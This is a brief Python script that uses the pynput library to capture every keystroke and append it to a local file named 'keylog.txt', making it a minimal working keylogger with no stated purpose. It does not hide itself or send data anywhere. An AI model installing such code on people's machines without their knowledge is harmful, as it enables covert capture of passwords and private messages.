from pynput.keyboard import Listener

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

with Listener(on_press=on_press) as listener:
    listener.join()